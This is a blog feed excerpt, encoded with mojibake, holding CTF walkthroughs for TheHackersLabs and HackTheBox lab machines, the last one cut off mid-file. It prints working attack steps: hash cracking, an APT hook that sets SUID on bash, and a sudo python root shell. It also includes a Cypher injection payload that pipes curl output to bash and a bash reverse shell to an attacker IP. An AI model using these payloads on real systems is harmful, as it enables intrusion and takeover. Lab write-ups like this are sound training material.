/>\n```\n\nåˆ°è¿™é‡Œæµ‹è¯•äº†å¯ä»¥ä½¿ç”¨ä¼ªåè®®ä½†æ˜¯ä¸èƒ½æ‰§è¡Œè¯­å¥ï¼Œä¹Ÿä¸å¯ä»¥åŒ…å«ï¼Œ`julia` å‰ `5000` ä¹Ÿæ²¡çˆ†ç ´å‡ºæ¥æœ‰ç‚¹æ²¡æ€è·¯\n\n![image.png](/post-images/TheHackersLabsMerchan/image9.png)\n\nçœ‹äº†ä¸‹ `WP`ï¼Œå‘ç°å¯†ç åœ¨ `rockyou` `7000`è¡Œâ€¦ (PSï¼šè§„åˆ™æ˜æ˜è¯´çˆ†ç ´éœ€è¦è®¾ç½®ä¸è¶…`5000`è¡Œçš„)\n\n![image.png](/post-images/TheHackersLabsMerchan/image10.png)\n\nç”¨æˆ·å®¶ç›®å½•ä¸‹è¯»å– `user.txt`\n\n```bash\njulia@Thehackerslabs-merchan:~$ cat user.txt \nb4axxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æƒé™æå‡\n\n`sudo` æƒé™ \n\n```bash\njulia@Thehackerslabs-merchan:~$ sudo -l\nsudo: unable to resolve host Thehackerslabs-merchan: Fallo temporal en la resoluciÃ³n del nombre\n[sudo] contraseÃ±a para julia: \nSorry, user julia may not run sudo on Thehackerslabs-merchan.\n```\n\nä¸Šä¼  `linpeas`\n\n```bash\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)\nâ•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files \n/dev/mqueue\n/dev/shm\n/etc/apt/apt.conf.d\n/home/julia\n```\n\nçœ‹åˆ°ä¸€ä¸ªæœ‰è¶£çš„å¯å†™ç›®å½• `/etc/apt/apt.conf.d`\n\n> https://zhuanlan.zhihu.com/p/1888937295215851002\n> \n\nå½“ç³»ç»Ÿè¿è¡Œ `apt update` æ—¶ï¼Œä¼šåŠ è½½ `/etc/apt/apt.conf.d` æ–‡ä»¶å¤¹çš„æ‰€æœ‰é…ç½®æ–‡ä»¶\n\n```scheme\necho 'APT::Update::Pre-Invoke {\"chmod +s /bin/bash\"}' > a\n```\n\nè¿‡äº†ä¸€ä¼šä¹‹åæˆ‘ä»¬å†æŸ¥çœ‹ `/bin/bash` æƒé™\n\n![image.png](/post-images/TheHackersLabsMerchan/image11.png)\n\nè¯»å– `root.txt`\n\n```scheme\nbash-5.2# cat root.txt \n056e7xxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/07/31/TheHackersLabsMerchan",
            "title": "TheHackersLabs - Merchan",
            "summary": "Merchan https://labs.thehackerslabs.com/machine/109 Recon PortScan Web å­åŸŸå & ç›®å½• çˆ†ç ´ è®¿é—® HTTP ï¼Œè¿™ä¸ªé¡µé¢ä»€ä¹ˆåŠŸèƒ½ç‚¹éƒ½æ²¡æœ‰ å°è¯•çˆ†ç ´ä¸€ä¸‹å­åŸŸåï¼Œåªæœ‰ www ç›®å½•çˆ†ç ´ï¼Œèƒ½æ‰«æå‡ºæ¥ä¸€ä¸ª secret.js è¢«æ··æ·†è¿‡äº†...",
            "date_modified": "2025-07-31T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "APT",
                "LFI",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/31/TheHackersLabsHEXTHINK SILENT SHADOW",
            "content_html": "\n# HEXTHINK SILENT SHADOW\n\n> https://labs.thehackerslabs.com/machine/110\n> \n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  HEXTHINK_SILENT_SHADOW nmap -sT -min-rate 10000 -p- 192.168.56.97\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:39 CST\nNmap scan report for 192.168.56.97\nHost is up (0.00038s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n9090/tcp open  zeus-admin\nMAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.42 seconds\n```\n\n```bash\nâœ  HEXTHINK_SILENT_SHADOW nmap -sT -A -p 22,80,3306,9090 192.168.56.97                           \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 21:41 CST\nNmap scan report for 192.168.56.97         \nHost is up (0.00041s latency).\n                                                                                                \nPORT     STATE SERVICE    VERSION                                                                                                                                                               \n22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:        \n|   256 4d:6e:39:a4:15:86:88:70:c7:9d:09:91:a3:0b:18:8c (ECDSA)\n|_  256 f9:21:5d:25:ee:76:05:db:01:3b:45:c9:68:b0:82:9f (ED25519)\n80/tcp   open  http       Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)                                                    \n|_http-title: Site doesn''t have a title (text/html; charset=UTF-8).\n3306/tcp open  mysql      MariaDB 5.5.5-10.11.11 \n| mysql-info:      \n|   Protocol: 10         \n|   Version: 5.5.5-10.11.11-MariaDB-0ubuntu0.24.04.2\n|   Thread ID: 35                                                                                                                                                                               \n|   Capabilities flags: 63486                                                                   \n|   Some Capabilities: SupportsCompression, Support41Auth, IgnoreSpaceBeforeParenthesis, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, SupportsTransactions, Speaks41ProtocolOld, InteractiveClient, Speaks41ProtocolNew, FoundRows, SupportsLoadDataLocal, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins\n|   Status: Autocommit                                                                                                                                                                          \n|   Salt: BwQo]cXnB?UoLmc(9'Wb                                                                  \n|_  Auth Plugin Name: mysql_native_password\n9090/tcp open  tcpwrapped     \nMAC Address: 08:00:27:78:E8:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)                \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                           \nDevice type: general purpose                                                                    \nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19                                                                   \nNetwork Distance: 1 hop                                                                         \nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                         \n                                                                                                \nTRACEROUTE                                                                                      \nHOP RTT     ADDRESS\n1   0.41 ms 192.168.56.97\n                                                                                                \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                           \nNmap done: 1 IP address (1 host up) scanned in 13.54 seconds \n```\n\n### æšä¸¾\n\nè®¿é—® `HTTP` ï¼Œæç¤ºäº†å¾ˆæœ‰æ„æ€çš„ä¸œè¥¿\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image1.png)\n\nå¾—åˆ°æ•°æ®åº“çš„ç”¨æˆ· `ctf_user`\n\nè¿æ¥æ•°æ®åº“ï¼Œæ„å¤–çš„å‘ç°ä¸ç”¨æ•°æ®åº“\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image2.png)\n\næ•°æ®åº“é‡Œé¢å¥½å‡ ä¸ªè¡¨ï¼ˆè´¦æˆ·ï¼Œé›‡å‘˜ï¼Œæ¶ˆæ¯ï¼Œä¾›åº”å•†ï¼Œç”¨æˆ·ï¼‰ï¼Œè¿˜å­˜äº†ä¸€äº›å›¾ç‰‡\n\nä¸€äº›æœ‰è¶£çš„ä¿¡æ¯ï¼š\n\n```bash\nBuscamos pentesters sin miedo. Contacto interno: d3v@n0m41n.\n//\nadmin\t21232f297a57a5a743894a0e4a801fc3\ntest\t098f6bcd4621d373cade4e832627b4f6\nsupport\te99a18c428cb38d5f260853678922e03\nh4cker\t5f4dcc3b5aa765d61d8327deb882cf99\n```\n\næˆ‘ä»¬å°†ç”¨æˆ·è¡¨è¿›è¡Œçˆ†ç ´\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image3.png)\n\n```bash\nâœ  HEXTHINK_SILENT_SHADOW john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 users\nUsing default input encoding: UTF-8\nLoaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=8\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword         (h4cker)     \nabc123           (support)     \nadmin            (admin)     \ntest             (test)     \n4g 0:00:00:00 DONE (2025-07-30 21:54) 200.0g/s 8313Kp/s 8313Kc/s 9350KC/s tyson4..tauruz\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed. \n```\n\nç›®å½•çˆ†ç ´\n\n```bash\nâœ  HEXTHINK_SILENT_SHADOW feroxbuster --url http://192.168.56.97/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip\n                                                                                        \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://192.168.56.97/\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [asp, php, txt, zip]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET        3l       38w      383c http://192.168.56.97/\n200      GET      872l     4588w    76866c http://192.168.56.97/index2.php\n200      GET        3l       38w      383c http://192.168.56.97/index.php\n301      GET        9l       28w      319c http://192.168.56.97/javascript => http://192.168.56.97/javascript/\n200      GET      872l     4588w    76849c http://192.168.56.97/info.php\n301      GET        9l       28w      326c http://192.168.56.97/javascript/jquery => http://192.168.56.97/javascript/jquery/\n[####################] - 3m   3114515/3114515 0s      found:7       errors:4      \n[####################] - 3m   1038145/1038145 5925/s  http://192.168.56.97/ \n[####################] - 3m   1038145/1038145 5868/s  http://192.168.56.97/javascript/ \n[####################] - 3m   1038145/1038145 6569/s  http://192.168.56.97/javascript/jquery/ \n```\n\n`index2.php` å’Œ `info.php` æ˜¯ä¸€æ ·çš„\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image4.png)\n\næ‰«æåå‘ç°ï¼Œç”¨æˆ·è¡¨ä¸­ä¿¡æ¯æ— ç”¨ï¼Œæˆ‘å·²ç»å°†å…¶æ‹¿å»è¿›è¡Œçˆ†ç ´äº†ï¼Œä½†æ˜¯æ²¡æœ‰ç»“æœ\n\nç„¶å `notice`è¡¨ä¸­ï¼Œæœ‰ä¸€ä¸ª â€˜ä½ å·²ç»èµ°äº†å¾ˆé•¿ä¸€æ®µè·¯ã€‚ä½†è¿˜æœ‰å¾ˆé•¿çš„è·¯è¦èµ°â€¦â€¦â€™ï¼Œå¹¶é™„ä¸Šäº†ä¸€å¼ ç…§ç‰‡\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image5.png)\n\næˆ‘ä»¬å°†ç…§ç‰‡ä¿å­˜ä¸‹æ¥ï¼Œæ ¼å¼æ˜¯ `JPG`\n\n![image.png](/post-images/TheHackersLabsHEXTHINK%20SILENT%20SHADOW/image6.png)\n\næˆ‘ä»¬å°è¯•æå–ä¿¡æ¯\n\n```bash\nâœ  HEXTHINK_SILENT_SHADOW binwalk -Me --run-as=root 2.jpg    \n\nScan Time:     2025-07-30 22:34:11\nTarget File:   /root/Desktop/TheHackersLabs/HEXTHINK_SILENT_SHADOW/2.jpg\nMD5 Checksum:  1576b20a92fe6ac42b11889e1f790aa1\nSignatures:    436\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\nWARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n\nâœ  HEXTHINK_SILENT_SHADOW stegseek 2.jpg            \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"hello\"\n[i] Original filename: \"instrucciones.txt\".\n[i] Extracting to \"2.jpg.out\".\n```\n\næœ€åä½¿ç”¨ `StegSeek` èƒ½è·å–åˆ°ä¸œè¥¿\n\n```bash\nâœ  HEXTHINK_SILENT_SHADOW cat 2.jpg.out                 \nPara continuar deberÃ¡s abrir el Puerto 9090\n\nEsto no es un escaneo Es un saludo\n\nEnvÃ­a la siguiente cadena al puerto 9090:\n\nLOGIN whisper\nKEY whisper9090\n\nNo lo hagas mal Solo hay una oportunidad\n```\n\nè®©æˆ‘å°†å…¶å‘é€åˆ° `9090`ï¼Œå¹¶ä¸”åªæœ‰ä¸€æ¬¡æœºä¼š\n\n```bash\nâœ  HEXTHINK_SILENT_SHADOW echo \"LOGIN whisper\\nKEY whisper9090\" | nc 192.168.56.97 9090\nUsuario SSH: whisper\nContraseÃ±a: 7h3m1nDf0x\n```\n\nå‘é€åå¾—åˆ°ä¸€ç»„è´¦æˆ·å‡­æ®\n\næˆ‘ä»¬è¿›è¡Œ `SSH` ç™»å½•ï¼Œæ‹¿ `user.txt`\n\n```bash\nwhisper@server:~$ cat user.txt \nTHL{8axxxxxxxxxxxxxx\n```\n\n## æƒé™æå‡\n\n`sudo` æƒé™\n\n```bash\nwhisper@server:~$ sudo -l\nMatching Defaults entries for whisper on server:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser whisper may run the following commands on server:\n    (ALL) NOPASSWD: /usr/bin/python3\n```\n\næ¢­å“ˆ\n\n```bash\nwhisper@server:~$ sudo /usr/bin/python3 -c \"import os;os.system('/bin/bash -p')\"\nroot@server:/home/whisper# \n```\n\n```bash\nroot@server:~# cat root.txt \nTHL{Zpxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/07/31/TheHackersLabsHEXTHINK SILENT SHADOW",
            "title": "TheHackersLabs - HEXTHINK SILENT SHADOW",
            "summary": "HEXTHINK SILENT SHADOW https://labs.thehackerslabs.com/machine/110 Recon PortScan æšä¸¾ è®¿é—® HTTP ï¼Œæç¤ºäº†å¾ˆæœ‰æ„æ€çš„ä¸œè¥¿ å¾—åˆ°æ•°æ®åº“çš„ç”¨æˆ· ctf user è¿æ¥æ•°æ®åº“ï¼Œæ„å¤–çš„å‘ç°ä¸ç”¨æ•°æ®åº“ æ•°æ®åº“é‡Œé¢å¥½å‡ ä¸ªè¡¨ï¼ˆ...",
            "date_modified": "2025-07-31T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "Mysql",
                "Python"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/29/HackTheBoxSeason7-Cypher",
            "content_html": "# Season7-Cypher\n\n> https://app.hackthebox.com/machines/Cypher | `Linux Â· Medium`\n> \n\n## å‰æœŸè¸©ç‚¹\n\n`10.10.11.57` æ˜¯é¶æœº\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/cypher î‚° nmap -sT -min-rate 10000 -p- 10.10.11.57              \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:19 EST\nNmap scan report for 10.10.11.57\nHost is up (0.13s latency).\nNot shown: 65352 filtered tcp ports (no-response), 181 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 26.15 seconds\n```\n\nå‘ç°åŸŸå `http://cypher.htb/` æ·»åŠ åˆ°`hosts`æ–‡ä»¶\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/cypher î‚° nmap -sT -A -T4 -O -p 22,80 10.10.11.57               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:20 EST\nNmap scan report for 10.10.11.57\nHost is up (0.25s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)\n|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)\n80/tcp open  http    nginx 1.24.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://cypher.htb/\n|_http-server-header: nginx/1.24.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   502.38 ms 10.10.16.1\n2   586.07 ms 10.10.11.57\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 43.03 seconds\n```\n\næ‰«æ`UDP`ç«¯å£\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/cypher î‚° nmap -sU -min-rate 10000 -p- cypher.htb \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:25 EST\nRTTVAR has grown to over 2.3 seconds, decreasing to 2.0\nNmap scan report for cypher.htb (10.10.11.57)\nHost is up (4.6s latency).\nNot shown: 65517 open|filtered udp ports (no-response)\nPORT      STATE  SERVICE\n476/udp   closed tn-tl-fd1\n5749/udp  closed unknown\n16119/udp closed unknown\n16380/udp closed unknown\n16424/udp closed unknown\n32237/udp closed unknown\n33895/udp closed unknown\n39619/udp closed unknown\n40153/udp closed unknown\n42240/udp closed unknown\n42704/udp closed unknown\n45096/udp closed unknown\n53762/udp closed unknown\n55811/udp closed unknown\n56083/udp closed unknown\n59387/udp closed unknown\n60627/udp closed unknown\n62347/udp closed unknown\n```\n\næ‰«æä¸€ä¸‹å­åŸŸå\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/cypher î‚° wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hc=302 -H 'Host:FUZZ.cypher.htb' -u http://cypher.htb                               \n\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://cypher.htb/\nTotal requests: 4989\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                       \n=====================================================================\n\nTotal time: 199.7973\nProcessed Requests: 4989\nFiltered Requests: 4989\nRequests/sec.: 24.97030\n```\n\nè®¿é—®`HTTP`ä¸»é¡µï¼Œè¿™ä¸ªåŠ¨ç”»æ•ˆæœå°†æˆ‘çš„`Kali`å‡»ç¢\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image27.png)\n\nè²Œä¼¼åœ¨ç™»å½•æ¡†å­˜åœ¨`SQL`æ³¨å…¥ï¼Œä½¿ç”¨`SQLMAP`å’Œæ‰‹åŠ¨æ³¨å…¥æ— æœ\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image28.png)\n\næ‰«æç›®å½•\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/cypher î‚° dirsearch -u cypher.htb -x 403,404,429 -e php,zip,txt                                                                        \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/cypher/reports/_cypher.htb/_25-03-02_08-33-32.txt\n\nTarget: http://cypher.htb/\n\n[08:33:32] Starting: \n[08:33:56] 200 -    5KB - /about\n[08:34:17] 307 -    0B  - /api/  ->  http://cypher.htb/api/api\n[08:34:17] 307 -    0B  - /api  ->  /api/docs\n[08:34:42] 307 -    0B  - /demo  ->  /login\n[08:34:42] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo\n[08:35:10] 200 -    4KB - /login\n[08:35:10] 200 -    4KB - /login.html\n[08:35:49] 301 -  178B  - /testing  ->  http://cypher.htb/testing/\n```\n\nå‘ç°æ–°ç›®å½•`testing` ï¼Œè®¿é—®ä¸‹è½½äº†`jar`æ–‡ä»¶\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image29.png)\n\n## åç¼–è¯‘ jar\n\nå°†`jar`æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨`jd-gui`åç¼–è¯‘\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image30.png)\n\nåœ¨å…¶ä¸­å‘ç°è²Œä¼¼å¯ä»¥å‘½ä»¤æ‰§è¡Œåœ°æ–¹\n\n```bash\nString[] command = { \"/bin/sh\", \"-c\", \"curl -s -o /dev/null --connect-timeout 1 -w %{http_code} \" + url };\n```\n\nä¸¢åˆ°`GPT`é‡Œè¿›è¡Œåˆ†æï¼š\n\n- è¯¥ Java ä»£ç æ˜¯ Neo4j è‡ªå®šä¹‰ APOCï¼ˆAwesome Procedures on Cypherï¼‰æ‰©å±•çš„ä¸€éƒ¨åˆ†ï¼Œæä¾› `custom.getUrlStatusCode` è¿‡ç¨‹ã€‚\n- è¯¥è¿‡ç¨‹æ¥æ”¶ä¸€ä¸ª URLï¼Œä½¿ç”¨ `curl` å‘½ä»¤è·å–å…¶ HTTP çŠ¶æ€ç ï¼Œå¹¶è¿”å›ã€‚\n- **æ”»å‡»ç¤ºä¾‹æ‰§è¡Œæ•ˆæœ**è¿™ä¼šå¯¼è‡´æœåŠ¡å™¨æ³„éœ²æ•æ„Ÿæ–‡ä»¶ `/etc/passwd`ã€‚\n    \n    ```\n    CALL custom.getUrlStatusCode(\"https://example.com; cat /etc/passwd\")\n    ```\n    \n    ```\n    curl -s -o /dev/null --connect-timeout 1 -w %{http_code} https://example.com; cat /etc/passwd\n    ```\n    \n\n## Cypher Injection\n\nçœ‹åˆ°`neo4j`æ‰å‘ç°ä¸Šé¢çš„å‹æ ¹ä¸æ˜¯`SQL`æ³¨å…¥ https://neo4j.com/docs/getting-started/cypher/\n\n> Cypher is Neo4jâ€™s declarative andÂ GQL conformantÂ query language. Available as open source viaÂ The openCypher project, Cypher isÂ similar to SQL, but optimized for graphs. | Cypher æ˜¯ Neo4j çš„å£°æ˜å¼å’Œç¬¦åˆ GQL çš„æŸ¥è¯¢è¯­è¨€ã€‚Cypher å¯é€šè¿‡openCypher é¡¹ç›®ä»¥å¼€æºå½¢å¼è·å¾—ï¼Œå®ƒç±»ä¼¼äº SQLï¼Œä½†é’ˆå¯¹å›¾å½¢è¿›è¡Œäº†ä¼˜åŒ–ã€‚\n> \n\nå°è¯•äº†ä½¿ç”¨`cyphermap`ä½†æ˜¯å§‹ç»ˆè¿”å›`Unable to find valid injection type...`\n\né€šè¿‡ ï¼šhttps://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection å¯ä»¥äº†è§£åˆ°`Cypher`æ³¨å…¥\n\néšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿å¯ä»¥åœ¨é”™è¯¯ä¸­å‘ç°æŸ¥è¯¢è¯­å¥\n\n```bash\n{message: Variable `c` not defined (line 1, column 75 (offset: 74))\n\"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' or 1=1 return c//' return h.value as hash\"\n                                                                           ^}\n```\n\næˆåŠŸé—­åˆ\n\n```bash\n{\"username\":\"admin' or 1=1 return h.value as hash//\",\"password\":\"1\" }\n```\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image31.png)\n\nå¸¦å¤–æµ‹è¯•\n\n```bash\n{\"username\":\"admin'return h.value as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.34/' + label AS r RETURN r as hash//\",\"password\":\"1\" }\n```\n\n![image.png](/post-images/HackTheBoxSeason7-Cypher/image32.png)\n\nç„¶åå¯ä»¥é€šè¿‡`custom` ç”¨æ¥å¼•ç”¨è‡ªå®šä¹‰çš„ç¨‹åºæˆ–å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å¸¦æœ‰å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³• https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/\n\næˆåŠŸå¸¦å¤–ï¼Œä½†æ˜¯æ— å›æ˜¾\n\n```bash\n{\n\t\"username\":\"' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"http://10.10.16.34;whoami\\\") YIELD statusCode AS a RETURN a;//\",\n\t\"password\":\"1\" \n}\n```\n\næ„é€ `payload`\n\n1. åœ¨kaliåˆ›å»ºå¸¦æœ‰åå¼¹shellè¯­å¥çš„æ–‡ä»¶shell.txtï¼ˆè®©æœåŠ¡å™¨è®¿é—®ï¼‰\n    \n    ```bash\n    /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.34/1234 0>&1'\n    ```\n    \n2. å¼€å¯ç›‘å¬\n    \n    ```bash\n    âš¡ root@kali î‚° ~/Desktop/test/cypher î‚° nc -lvnp 1234\n    listening on [any] 1234 ...\n    ```\n    \n3. å¼€å¯ç®€æ˜“æœåŠ¡å™¨\n4. æ„é€ `payload`\n    \n    ```bash\n    {\n    \t\"username\":\"' return h.value as a UNION CALL custom.getUrlStatusCode(\\\"http://10.10.16.34;curl http://10.10.16.34/shell.txt|bash\\\") YIELD statusCode AS a RETURN a;//\",\n    \t\"password\":\"1\" \n    }\n    ```\n    \n    æˆåŠŸè·å¾—`shell`\n    \n    ![image.png](/post-images/HackTheBoxSeason7-Cypher/image33.png)\n    \n\n## ææƒ\n\nä¿¡æ¯æ”¶é›†ä¸€æ³¢\n\n```bash\nneo4j@cypher:/home/graphasm$ ls -al\ntotal 56\ndrwxr-xr-x 9 graphasm graphasm 4096 Mar  2 13:01 .\ndrwxr-xr-x 3 root     root     4096 Oct  8 17:58 ..\nlrwxrwxrwx 1 root     root        9 Oct  8 18:06 .bash_history -> /dev/null\n-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout\n-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc\ndrwxrwxr-x 8 graphasm graphasm 4096 Mar  2 11:35 .bbot\n-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml\ndrwx------ 3 graphasm graphasm 4096 Mar  2 11:35 .cache\ndrwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:18 .config\ndrwx------ 3 graphasm graphasm 4096 Mar  2 13:01 .gnupg\ndrwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:20 .local\n-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile\ndrwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .ssh\ndrwxrwxr-x 8 graphasm graphasm 4096 Mar  2 13:38 testoutput\n-rw-r----- 1 root     graphasm   33 Mar  2 11:16 user.txt\n```\n\nbbot_preset.yml å¾—åˆ°ä¸€ç»„è´¦å·å¯†ç \n\n```bash\nneo4j@cypher:/home/graphasm$ cat bbot_preset.yml\ntargets:\n  - ecorp.htb\n\noutput_dir: 